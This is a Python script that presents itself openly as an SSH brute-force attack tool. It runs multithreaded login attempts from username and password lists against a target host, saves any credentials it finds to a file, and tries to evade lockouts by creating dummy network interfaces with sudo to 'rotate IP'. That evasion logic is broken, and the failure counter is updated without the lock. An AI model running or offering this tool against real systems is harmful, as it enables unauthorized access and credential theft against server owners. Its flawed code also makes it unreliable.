import paramiko
import socket
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Load username and password lists
username_file = "usernames.txt"
password_file = "passwords.txt"
target_ip = "127.0.0.1"  # Replace with the target's IP address
ssh_port = 22

# Lock for thread-safe operations
lock = Lock()
fail_counter = 0  # To count failed attempts

# File to store successful attempts
success_file = "ssh_success.txt"

# Helper functions for interface manipulation
def create_interface(iface_name, ip):
    subprocess.call(["sudo", "ip", "link", "add", iface_name, "type", "dummy"])
    subprocess.call(["sudo", "ip", "addr", "add", ip, "dev", iface_name])
    subprocess.call(["sudo", "ip", "link", "set", iface_name, "up"])

def delete_interface(iface_name):
    subprocess.call(["sudo", "ip", "link", "delete", iface_name])

def rotate_ip():
    """Rotate IP by creating a new interface with a unique IP address."""
    iface_name = f"temp_iface_{fail_counter}"
    new_ip = f"192.168.1.{100 + fail_counter % 50}"  # Generate new IP
    delete_interface(iface_name)  # Clean up any previous interface
    create_interface(iface_name, new_ip)
    return iface_name

# Function to attempt SSH login with a specific username and password
def ssh_connect(username, password):
    global fail_counter

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    iface_name = rotate_ip() if fail_counter % 3 == 0 else None  # Rotate IP every 3 failed attempts

    try:
        ssh_client.connect(target_ip, port=ssh_port, username=username, password=password, timeout=3)
        with lock:
            print(f"[+] Found credentials - Username: {username} | Password: {password}")
            with open(success_file, "a") as f:
                f.write(f"Username: {username} | Password: {password}\n")
        ssh_client.close()
        return True
    except paramiko.AuthenticationException:
        # Authentication failed
        fail_counter += 1
    except (socket.error, paramiko.SSHException) as e:
        with lock:
            print(f"[-] Connection error for {username}:{password} - {e}")
    finally:
        ssh_client.close()
        if iface_name:
            delete_interface(iface_name)  # Clean up after IP rotation

    return False

# Main function to read username and password lists and start threads
def main():
    try:
        with open(username_file, "r") as user_file:
            usernames = user_file.read().splitlines()
        with open(password_file, "r") as pass_file:
            passwords = pass_file.read().splitlines()
    except FileNotFoundError as e:
        print(f"File not found: {e}")
        sys.exit(1)

    print("[*] Starting SSH brute force attack...")

    with ThreadPoolExecutor(max_workers=10) as executor:  # Increased thread count for speed
        for username in usernames:
            for password in passwords:
                executor.submit(ssh_connect, username, password)

if __name__ == "__main__":
    main()
